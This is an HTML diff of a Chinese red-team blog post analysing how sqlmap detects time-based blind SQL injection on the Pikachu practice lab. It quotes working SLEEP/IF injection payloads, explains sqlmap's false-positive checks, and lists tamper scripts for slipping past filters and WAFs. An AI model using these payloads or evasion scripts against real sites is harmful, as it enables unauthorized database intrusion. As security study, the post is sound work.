@@ -1,0 +1,566 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>红队基础设施建设与改造（二）——深入理解sqlmap(下) // Y4ph3tS blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.139.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Y4ph3tS" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="红队基础设施建设与改造（二）——深入理解sqlmap(下)">
+  <meta name="twitter:description" content="本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！
+在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。
+我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。
+还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.
+再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同
+所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒
+那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。
+根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：
+我们所使用的payload为lucy’ and if ((substr(version(),1,1))=‘5’,sleep(5),null)#
+sqlmap中的时间盲注就比较简单了，代码如下：
+这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为
+我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示
+接下来我们具体分析一下数据包，以下为攻击完整过程的截图
+接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片
+url经过转码后如下：
+/pikachu/vul/sqli/sqli_blind_t.php?name=123’ AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND ‘sRRR’=‘sRRR&amp;submit=查询
+此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入
+在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。
+从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测
+以下记录为77开始的payload
+name=123&#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &#39;HxIh&#39;=&#39;HxIh name=123&#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &#39;YVSA&#39;=&#39;YVSA name=123&#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &#39;YJgx&#39;=&#39;YJgx name=123&#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &#39;kXSW&#39;=&#39;kXSW name=123&#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &#39;EOyg&#39;=&#39;EOyg name=123&#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &#39;vZOZ&#39;=&#39;vZOZ 而从85组开始又出现了新的变化">
+
+    <meta property="og:url" content="http://127.0.0.1:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/">
+  <meta property="og:site_name" content="Y4ph3tS blog">
+  <meta property="og:title" content="红队基础设施建设与改造（二）——深入理解sqlmap(下)">
+  <meta property="og:description" content="本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！
+在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。
+我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。
+还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.
+再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同
+所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒
+那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。
+根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：
+我们所使用的payload为lucy’ and if ((substr(version(),1,1))=‘5’,sleep(5),null)#
+sqlmap中的时间盲注就比较简单了，代码如下：
+这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为
+我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示
+接下来我们具体分析一下数据包，以下为攻击完整过程的截图
+接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片
+url经过转码后如下：
+/pikachu/vul/sqli/sqli_blind_t.php?name=123’ AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND ‘sRRR’=‘sRRR&amp;submit=查询
+此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入
+在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。
+从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测
+以下记录为77开始的payload
+name=123&#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &#39;HxIh&#39;=&#39;HxIh name=123&#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &#39;YVSA&#39;=&#39;YVSA name=123&#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &#39;YJgx&#39;=&#39;YJgx name=123&#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &#39;kXSW&#39;=&#39;kXSW name=123&#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &#39;EOyg&#39;=&#39;EOyg name=123&#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &#39;vZOZ&#39;=&#39;vZOZ 而从85组开始又出现了新的变化">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-12-10T02:11:09+08:00">
+    <meta property="article:modified_time" content="2020-12-10T02:11:09+08:00">
+    <meta property="article:tag" content="红队技术">
+    <meta property="article:tag" content="红队武器研究">
+    <meta property="article:tag" content="Sqlmap">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://127.0.0.1:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <span class="app-header-title">Y4ph3tS blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Valar Morghulis</p>
+      <div class="app-header-social">
+        
+          <a href="https://yaphetszz.github.com" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">红队基础设施建设与改造（二）——深入理解sqlmap(下)</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 10, 2020
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          
+          12916 Words - 
+          
+          26 min read
+        </div>
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="http://127.0.0.1:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="http://127.0.0.1:1313/tags/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E7%A0%94%E7%A9%B6/">红队武器研究</a>
+              <a class="tag" href="http://127.0.0.1:1313/tags/sqlmap/">Sqlmap</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><strong>本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！</strong></p>
+<p>在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。</p>
+<p>我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。</p>
+<p>还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.</p>
+<p><img src="../ksohtml20628/wps1.jpg" alt="img"></p>
+<p>再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同</p>
+<p><img src="../ksohtml20628/wps2.jpg" alt="img"></p>
+<p>所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒</p>
+<p><img src="../ksohtml20628/wps3.jpg" alt="img"></p>
+<p>那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。</p>
+<p><img src="../ksohtml20628/wps4.jpg" alt="img"></p>
+<p>根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：</p>
+<p><img src="../ksohtml20628/wps5.jpg" alt="img"></p>
+<p>我们所使用的payload为lucy&rsquo; and if ((substr(version(),1,1))=&lsquo;5&rsquo;,sleep(5),null)#</p>
+<p>sqlmap中的时间盲注就比较简单了，代码如下：</p>
+<p><img src="../ksohtml20628/wps6.jpg" alt="img"></p>
+<p>这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为</p>
+<p><img src="../ksohtml20628/wps7.jpg" alt="img"></p>
+<p>我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示</p>
+<p><img src="../ksohtml20628/wps8.jpg" alt="img"></p>
+<p>接下来我们具体分析一下数据包，以下为攻击完整过程的截图</p>
+<p><img src="../ksohtml20628/wps9.jpg" alt="img"></p>
+<p>接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片</p>
+<p><img src="../ksohtml20628/wps10.jpg" alt="img"></p>
+<p>url经过转码后如下：</p>
+<p>/pikachu/vul/sqli/sqli_blind_t.php?name=123&rsquo; AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND &lsquo;sRRR&rsquo;=&lsquo;sRRR&amp;submit=查询</p>
+<p>此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入</p>
+<p><img src="../ksohtml20628/wps11.jpg" alt="img"></p>
+<p>在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。</p>
+<p>从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测</p>
+<p><img src="../ksohtml20628/wps12.jpg" alt="img"></p>
+<p>以下记录为77开始的payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &#39;</span>HxIh<span style="color:#e6db74">&#39;=&#39;</span>HxIh
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &#39;</span>YVSA<span style="color:#e6db74">&#39;=&#39;</span>YVSA
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &#39;</span>YJgx<span style="color:#e6db74">&#39;=&#39;</span>YJgx
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &#39;</span>kXSW<span style="color:#e6db74">&#39;=&#39;</span>kXSW
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &#39;</span>EOyg<span style="color:#e6db74">&#39;=&#39;</span>EOyg
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &#39;</span>vZOZ<span style="color:#e6db74">&#39;=&#39;</span>vZOZ
+</span></span></code></pre></div><p>而从85组开始又出现了新的变化</p>
+<p><img src="../ksohtml20628/wps13.jpg" alt="img"></p>
+<pre tabindex="0"><code>name=123&#39; AND (SELECT 6734 FROM (SELECT(SLEEP(5-(IF(2152=2152,0,5)))))Abmt) AND &#39;dqby&#39;=&#39;dqby
+</code></pre><p>86组还是原来的发包方式</p>
+<pre tabindex="0"><code>name=123&#39; AND (SELECT 4418 FROM (SELECT(SLEEP(5-(IF(1431&gt;1430,0,5)))))IQGO) AND &#39;UneZ&#39;=&#39;UneZ
+</code></pre><p>87组进行了数据库版本判断</p>
+<p><img src="../ksohtml20628/wps14.jpg" alt="img"></p>
+<pre tabindex="0"><code>name=123&#39; AND (SELECT 4121 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))OEbt) AND &#39;KRkM&#39;=&#39;KRkM
+</code></pre><p>其中16进制字符串为%MariaDB%，这是sqlmap进行的指纹判断，之后的五个组也对应了其他几个字段</p>
+<p><img src="../ksohtml20628/wps15.jpg" alt="img"></p>
+<p>至此我的wireshark已经开了一万个页面了</p>
+<p><img src="../ksohtml20628/wps16.jpg" alt="img"></p>
+<p>这时候突然想到，我为什么不用&ndash;proxy参数把sqlmap的流量转发到BURP呢？发现可行之后&hellip;猛虎落泪&hellip;</p>
+<p><img src="../ksohtml20628/wps17.jpg" alt="img"></p>
+<p>通过上述对数据包的分析可知，sqlmap并非一个包成功就判定为成功，同样的包发了三次，之后还有其他按照我们之前分析的逻辑进行构造的包，关键为payload的如下部分：</p>
+<p><img src="../ksohtml20628/wps18.jpg" alt="img"></p>
+<p>可以看到四位数字，四个随机字符都是我们在前文中发现的生成部分，对应函数为randomStr函数，为了避免大家忘记这里再放一张图</p>
+<p><img src="../ksohtml20628/wps19.jpg" alt="img"></p>
+<p>通过上述分析可见，在进行了第一次成功的注入后，sqlmap会进行误报检测，也就是77组开始的数据包中所使用的IF判断语句，通过加上判断进一步确定目标是否存在注入，如果判断为真即SLEEP语句执行，判断为假则不执行，以下为对应的payload的复现：</p>
+<p><img src="../ksohtml20628/wps20.jpg" alt="img"></p>
+<p><img src="../ksohtml20628/wps21.jpg" alt="img"></p>
+<p>sqlmap的误报逻辑分为五层对比，会生成三个数字a&lt;b&lt;c,进行如下五次判定</p>
+<p>\ 1. payload(a=a)</p>
+<p>\2. payload(a=c）</p>
+<p>\3. payload(b=c)</p>
+<p>\4. payload(b=b)</p>
+<p>\5. payload(b c)</p>
+<p>上述的五次判断为和原始发包响应对比，当判定结果分别为FTTFT时发生误报。我们来跟进一下误报逻辑的代码，误报的检测函数为checks.py中的checkFalsePositives（injection）</p>
+<p>核心部分代码如下：</p>
+<p><img src="../ksohtml20628/wps22.jpg" alt="img"></p>
+<p>可以看到生成了三个随机数，对应上面给大家讲到的abc三个数，然后是五层的对比</p>
+<p><img src="../ksohtml20628/wps23.jpg" alt="img"></p>
+<p>通过五层的对比，可以看到我们之前抓到的数据包中五次对比的响应均符合要求不存在误报。</p>
+<p>以上为sqlmap的常规工作逻辑以及针对常见注入漏洞的注入检测逻辑。但是在实际过程中，大部分时候并不是sqlmap一把梭就可以getshell的，我们再来分析一下sqlmap的附加功能也是较为强大的功能即sqlmap的tamper脚本（主要是上篇自己给自己挖了坑）。</p>
+<p>tamper是sqlmap的拓展脚本，用于对一些字符进行过滤或者实现其他操作，就和nmap的第三方NSE脚本差不多，支持个人开发从外部加载，正如NSE脚本一样，sqlmap也内置了一大堆的tamper</p>
+<p><img src="../ksohtml20628/wps24.jpg" alt="img"></p>
+<p>可以看到内置的当中就有64个脚本，我们先来给大家分析一波常用的脚本，再讲讲tamper的开发，首先是针对所有类型数据库的脚本，例如apostrophemask.py</p>
+<p><img src="../ksohtml20628/wps25.jpg" alt="img"></p>
+<p>可以看到是用utf8替换引号的脚本，曾经在一次项目中针对老版本的dz还是啥模板的一个站用的时候出现奇效最终成功getshell完成了项目要求。</p>
+<p>还有base64encode.py，看名字都知道是用base64替换payload的脚本，现在很多站为了防止注入都会在传入参数时做一个加密（虽然可能并没有什么卵用），这时候就可以通过该脚本加密payload。</p>
+<p><img src="../ksohtml20628/wps26.jpg" alt="img"></p>
+<p>还有space2randomblank.py可以将空格用一些随机空白字符代替。</p>
+<p><img src="../ksohtml20628/wps27.jpg" alt="img"></p>
+<p>其他更广泛的用途介绍如下表：</p>
+<table>
+  <thead>
+      <tr>
+          <th><em><strong>*序号*</strong></em></th>
+          <th><em><strong>*脚本名称*</strong></em></th>
+          <th><em><strong>*注释*</strong></em></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>0x2char</td>
+          <td>将每个编码后的字符转换为等价表达</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>apostrophemask</td>
+          <td>单引号替换为Utf8字符</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>apostrophenullencode</td>
+          <td>替换双引号为%00%27</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>appendnullbyte</td>
+          <td>有效代码后添加%00</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>base64encode</td>
+          <td>使用base64编码</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>between</td>
+          <td>比较符替换为between</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>bluecoat</td>
+          <td>空格替换为随机空白字符，等号替换为like</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>chardoubleencode</td>
+          <td>双url编码</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>charencode</td>
+          <td>将url编码</td>
+      </tr>
+      <tr>
+          <td>10</td>
+          <td>charunicodeencode</td>
+          <td>使用unicode编码</td>
+      </tr>
+      <tr>
+          <td>11</td>
+          <td>charunicodeescape</td>
+          <td>以指定的payload反向编码未编码的字符</td>
+      </tr>
+      <tr>
+          <td>12</td>
+          <td>commalesslimit</td>
+          <td>改变limit语句的写法</td>
+      </tr>
+      <tr>
+          <td>13</td>
+          <td>commalessmid</td>
+          <td>改变mid语句的写法</td>
+      </tr>
+      <tr>
+          <td>14</td>
+          <td>commentbeforeparentheses</td>
+          <td>在括号前加内联注释</td>
+      </tr>
+      <tr>
+          <td>15</td>
+          <td>concat2concatws</td>
+          <td>替换CONCAT为CONCAT_WS</td>
+      </tr>
+      <tr>
+          <td>16</td>
+          <td>equaltolike</td>
+          <td>等号替换为like</td>
+      </tr>
+      <tr>
+          <td>17</td>
+          <td>escapequotes</td>
+          <td>双引号替换为\\</td>
+      </tr>
+      <tr>
+          <td>18</td>
+          <td>greatest</td>
+          <td>大于号替换为greatest</td>
+      </tr>
+      <tr>
+          <td>19</td>
+          <td>halfversionedmorekeywords</td>
+          <td>在每个关键字前加注释</td>
+      </tr>
+      <tr>
+          <td>20</td>
+          <td>htmlencode</td>
+          <td>html编码所有非字母和数字的字符</td>
+      </tr>
+      <tr>
+          <td>21</td>
+          <td>ifnull2casewhenisnull</td>
+          <td>改变ifnull语句的写法</td>
+      </tr>
+      <tr>
+          <td>22</td>
+          <td>ifnull2ifisnull</td>
+          <td>替换ifnull为if(isnull(A))</td>
+      </tr>
+      <tr>
+          <td>23</td>
+          <td>informationschemacomment</td>
+          <td>标示符后添加注释</td>
+      </tr>
+      <tr>
+          <td>24</td>
+          <td>least</td>
+          <td>替换大于号为least</td>
+      </tr>
+      <tr>
+          <td>25</td>
+          <td>lowercase</td>
+          <td>全部替换为小写值</td>
+      </tr>
+      <tr>
+          <td>26</td>
+          <td>modsecurityversioned</td>
+          <td>空格替换为查询版本的注释</td>
+      </tr>
+      <tr>
+          <td>27</td>
+          <td>modsecurityzeroversioned</td>
+          <td>添加完整的查询版本的注释</td>
+      </tr>
+      <tr>
+          <td>28</td>
+          <td>multiplespaces</td>
+          <td>添加多个空格</td>
+      </tr>
+      <tr>
+          <td>29</td>
+          <td>nonrecursivereplacement</td>
+          <td>替换预定义的关键字</td>
+      </tr>
+      <tr>
+          <td>30</td>
+          <td>overlongutf8</td>
+          <td>将所有字符转义为utf8</td>
+      </tr>
+      <tr>
+          <td>31</td>
+          <td>overlongutf8more</td>
+          <td>以指定的payload转换所有字符</td>
+      </tr>
+      <tr>
+          <td>32</td>
+          <td>percentage</td>
+          <td>每个字符前添加%</td>
+      </tr>
+      <tr>
+          <td>33</td>
+          <td>plus2concat</td>
+          <td>将加号替换为concat函数</td>
+      </tr>
+      <tr>
+          <td>34</td>
+          <td>plus2fnconcat</td>
+          <td>将加号替换为ODBC函数{fn CONCAT()}</td>
+      </tr>
+      <tr>
+          <td>35</td>
+          <td>randomcase</td>
+          <td>字符大小写随机替换</td>
+      </tr>
+      <tr>
+          <td>36</td>
+          <td>randomcomments</td>
+          <td>/**/分割关键字</td>
+      </tr>
+      <tr>
+          <td>37</td>
+          <td>securesphere</td>
+          <td>添加某字符串</td>
+      </tr>
+      <tr>
+          <td>38</td>
+          <td>sp_password</td>
+          <td>追加sp_password字符串</td>
+      </tr>
+      <tr>
+          <td>39</td>
+          <td>space2comment</td>
+          <td>空格替换为/**/</td>
+      </tr>
+      <tr>
+          <td>40</td>
+          <td>space2dash</td>
+          <td>空格替换为&ndash;加随机字符</td>
+      </tr>
+      <tr>
+          <td>41</td>
+          <td>space2hash</td>
+          <td>空格替换为#加随机字符</td>
+      </tr>
+      <tr>
+          <td>42</td>
+          <td>space2morecomment</td>
+          <td>空格替换为/<strong>_</strong>/</td>
+      </tr>
+      <tr>
+          <td>43</td>
+          <td>space2morehash</td>
+          <td>空格替换为#加随机字符及换行符</td>
+      </tr>
+      <tr>
+          <td>44</td>
+          <td>space2mssqlblank</td>
+          <td>空格替换为其他空符号</td>
+      </tr>
+      <tr>
+          <td>45</td>
+          <td>space2mssqlhash</td>
+          <td>空格替换为%23%0A</td>
+      </tr>
+      <tr>
+          <td>46</td>
+          <td>space2mysqlblank</td>
+          <td>空格替换为其他空白符号</td>
+      </tr>
+      <tr>
+          <td>47</td>
+          <td>space2mysqldash</td>
+          <td>空格替换为&ndash;%0A</td>
+      </tr>
+      <tr>
+          <td>48</td>
+          <td>space2plus</td>
+          <td>空格替换为加号</td>
+      </tr>
+      <tr>
+          <td>49</td>
+          <td>space2randomblank</td>
+          <td>空格替换为备选字符集中的随机字符</td>
+      </tr>
+      <tr>
+          <td>50</td>
+          <td>symboliclogical</td>
+          <td>AND和OR替换为&amp;&amp;和||</td>
+      </tr>
+      <tr>
+          <td>51</td>
+          <td>unionalltounion</td>
+          <td>union all select替换为union select</td>
+      </tr>
+      <tr>
+          <td>52</td>
+          <td>unmagicquotes</td>
+          <td>宽字符绕过GPC</td>
+      </tr>
+      <tr>
+          <td>53</td>
+          <td>uppercase</td>
+          <td>全部替换为大写值</td>
+      </tr>
+      <tr>
+          <td>54</td>
+          <td>varnish</td>
+          <td>添加HTTP头</td>
+      </tr>
+      <tr>
+          <td>55</td>
+          <td>versionedkeywords</td>
+          <td>用注释封装每个非函数的关键字</td>
+      </tr>
+      <tr>
+          <td>56</td>
+          <td>versionedmorekeywords</td>
+          <td>使用注释绕过</td>
+      </tr>
+      <tr>
+          <td>57</td>
+          <td>xforwardedfor</td>
+          <td>添加伪造的HTTP头</td>
+      </tr>
+  </tbody>
+</table>
+<p>那么如果我们要自己开发，应该怎么办呢？接下来就讲讲具体的开发方式。</p>
+<p>我们新建一个testtmp.py放入tamper目录下</p>
+<p>第一行写上调用，PRIORITY为优先级</p>
+<p><img src="../ksohtml20628/wps28.jpg" alt="img"></p>
+<p>然后写上级别，对应的属性如下，我们选择LOW就可以</p>
+<p><img src="../ksohtml20628/wps29.jpg" alt="img"></p>
+<p>然后是固定结构依赖dependencies和tamper</p>
+<p><img src="../ksohtml20628/wps30.jpg" alt="img"></p>
+<p>依赖可以声明适用和不适用的版本信息等，如果无则为pass，如果有如下图所示案例样填写</p>
+<p><img src="../ksohtml20628/wps31.jpg" alt="img"></p>
+<p>tamper为主函数，支持payload和**kwargs参数</p>
+<p>tamper主要用于修改payload内容，例如我们之前看到的替换和加密等操作。操作结果返回需要return</p>
+<p><img src="../ksohtml20628/wps32.jpg" alt="img"></p>
+<p>如果我们需要操作payload，例如对某关键字进行双写，直接进行return即可，编写的脚本如下：</p>
+<p><img src="../ksohtml20628/wps33.jpg" alt="img"></p>
+<p>如果该payload需要经过base64，我们再加一层，这时候需要依赖，完整的脚本如下所示：</p>
+<p><img src="../ksohtml20628/wps34.jpg" alt="img"></p>
+<p>如果目标服务器启用了一些验证，例如只允许本地访问等，但是校验的为XFF头，这时候我们就需要用到kwargs参数了，具体如下：</p>
